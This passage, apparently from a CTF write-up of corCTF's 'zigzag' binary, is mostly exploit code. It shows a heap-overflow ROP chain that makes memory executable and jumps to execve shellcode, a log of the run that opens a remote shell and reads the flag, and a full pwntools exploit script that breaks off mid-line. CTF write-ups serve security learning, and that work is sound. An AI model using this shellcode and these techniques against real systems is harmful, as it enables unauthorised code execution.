alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x400&lt;/span&gt;, pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x203147&lt;/span&gt;) \ &lt;span style=&#34;color:#75715e&#34;&gt;# pop rdi ; ret&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x208000&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; \ &lt;span style=&#34;color:#75715e&#34;&gt;# target area for the shellcode&lt;/span&gt;
        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x20351b&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; \ &lt;span style=&#34;color:#75715e&#34;&gt;# pop rsi ; ret&lt;/span&gt;
        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; \ &lt;span style=&#34;color:#75715e&#34;&gt;# length&lt;/span&gt;
        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x201fcf&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; \ &lt;span style=&#34;color:#75715e&#34;&gt;# pop rax ; syscall&lt;/span&gt;
        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xa&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; \ &lt;span style=&#34;color:#75715e&#34;&gt;# SYS_mprotect&lt;/span&gt;
        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x208000&lt;/span&gt;)) &lt;span style=&#34;color:#75715e&#34;&gt;# jump on the shellcode + PROFIT&lt;/span&gt;

edit(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x400&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x400&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(stack&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0xd0&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;))

alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;, pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x202d16&lt;/span&gt;)) &lt;span style=&#34;color:#75715e&#34;&gt;# valid return address&lt;/span&gt;
edit(&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7&lt;/span&gt;, pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0000000000203715&lt;/span&gt;)) &lt;span style=&#34;color:#75715e&#34;&gt;# magic gadget&lt;/span&gt;

io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;profit&#34;&gt;PROFIT&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nasm@off:~/Documents/pwn/corCTF/zieg$ python3 remote.py REMOTE HOST=be.ax PORT=31278
[*] &#39;/home/nasm/Documents/pwn/corCTF/zieg/zigzag&#39;
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x200000)
[+] Opening connection to be.ax on port 31278: Done
[*] stack: 0x7ffc2ca48ae8
[*] Loaded 37 cached gadgets for &#39;zigzag&#39;
[*] Using sigreturn for &#39;SYS_execve&#39;
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls
flag.txt
zigzag
$ cat flag.txt
corctf{bl4Z1nGlY_f4sT!!}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;appendices&#34;&gt;Appendices&lt;/h2&gt;
&lt;p&gt;Final exploit:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# this exploit was generated via&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 1) pwntools&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 2) ctfmate&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; time
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pwn


&lt;span style=&#34;color:#75715e&#34;&gt;# Set up pwntools for the correct architecture&lt;/span&gt;
exe &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;zigzag&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# pwn.context.terminal = [&amp;#39;tmux&amp;#39;, &amp;#39;new-window&amp;#39;] &lt;/span&gt;
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;delete_corefiles &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rename_corefiles &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;

host &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;HOST &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;
port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;PORT &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;)


&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;local&lt;/span&gt;(argv&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[], &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kw):
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;Execute the target binary locally&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GDB:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;debug([exe&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; argv, gdbscript&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;gdbscript, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kw)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;process([exe&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; argv, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kw)


&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;remote&lt;/span&gt;(argv&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[], &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kw):
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;Connect to the process on the remote host&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
    io &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect(host, port)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GDB:
        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;attach(io, gdbscript&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;gdbscript)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; io


&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;start&lt;/span&gt;(argv&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[], &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kw):
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;Start the exploit against the target.&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;LOCAL:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; local(argv, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kw)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; remote(argv, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kw)


gdbscript &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;source ~/Downloads/pwndbg/gdbinit.py
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;locals())

io &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;

io &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; start()

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;alloc&lt;/span&gt;(idx, size, data):
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Index: &amp;#34;&lt;/span&gt;, str(idx)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Size: &amp;#34;&lt;/span&gt;, str(size)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Data: &amp;#34;&lt;/span&gt;, data)


&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;delete&lt;/span&gt;(idx):
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Index: &amp;#34;&lt;/span&gt;, str(idx)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;show&lt;/span&gt;(idx):
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Index: &amp;#34;&lt;/span&gt;, str(idx)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;edit&lt;/span&gt;(idx, size, data):
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;4&amp;#34;&lt;/span&gt;)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Index: &amp;#34;&lt;/span&gt;, str(idx)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Size: &amp;#34;&lt;/span&gt;, str(size)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Data: &amp;#34;&lt;/span&gt;, data)

alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x500&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;):
    alloc(i, &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;vv&amp;#34;&lt;/span&gt;)

edit(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x400&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x400&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x208000&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x000&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;))

alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;)
show(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;)

stack &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;u64(io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;))
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stack: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(stack)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)

edit(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x400&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x400&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x208000&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x000&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;))

shellcode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;

alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;, shellcode)

&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x0000000000201fcf : pop rax ; syscall
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x0000000000203147 : pop rdi ; ret
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x000000000020351b : pop rsi ; ret
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x00000000002035cf : xor edx, edx ; mov rsi, qword ptr [r9] ; xor eax, eax ; syscall
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x0000000000201e09 : ret
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x0000000000203715 : add rsp, 0x68 ; pop rbx ; pop r14 ; ret
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;

rop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ROP(exe)
binsh &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x208000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;)
rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;execve(binsh, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)

edit(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x400&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x400&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(stack&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x50&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span 